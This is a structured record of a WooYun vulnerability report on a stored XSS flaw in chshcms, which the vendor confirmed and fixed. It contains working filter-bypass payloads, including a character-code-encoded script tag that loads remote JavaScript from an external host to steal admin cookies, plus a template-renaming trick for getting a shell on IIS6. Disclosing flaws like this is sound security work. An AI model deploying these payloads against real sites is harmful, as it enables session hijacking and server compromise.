{"id": 57905, "wybug_id": "wooyun-2014-052911", "wybug_title": "程氏舞曲储存型xss（3）附后台getshell", "wybug_corp": "chshcms.com", "wybug_author": "roker", "wybug_date": "2014-03-06 12:02", "wybug_open_date": "2014-06-04 12:02", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-03-09：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-04-30：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-05-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-05-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-04：\t细节向公众公开  简要描述： 没有过滤完全。。 详细说明：  官方修补的还不是很完美呢，黑盒测试下，在上次添加文章处 提交 <img src =x onerror=\"\"> <script>后台查看源码 内容已经没有了提交 <img>后台查看源码 有 <img>提交 onerror后台 看下 出现了 onerror那么，基本可以确定 是判断 <>内 是否存在 script onerror onclick。。。等关键字。这样就很好办了， 找到一个位于html 标签属性内的可控点 就行了当然 还要 \"\"闭合，然而在文章标题处输入 \" 发现\"被过滤成 \\&quot;了,经过一轮 fuzzing，发现 在 添加专题处\n\n抓包 修改cs_pic 值为 \n\" onfocusin=alert(0)  autofocus x=\"\n\n\n成功alert \n\n当然 仅仅是alert还是不够的，远程加载js才是王道。。。。应为对 单引号的过滤 所以可以类似于这样\nonfocusin=write(String.fromCharCode(60,115,99,114,105,112,116,32,115,114,99,61,34,47,47,120,115,115,46,119,101,98,118,117,108,46,99,111,109,47,53,78,86,104,110,83,34,62,60,47,115,99,114,105,112,116,62))  autofocus x=\"\n收到cookie，打到后台\n\ngetshell的话，iis6下解析漏洞 模板名改为 xxx.php;即可   漏洞证明：  \n\n   修复方案：  过滤规则改下。   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-03-06 16:13 厂商回复： 非常感谢~！已经修复~ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-07 01:57 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  低调求礼物。。@chshcms.com    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}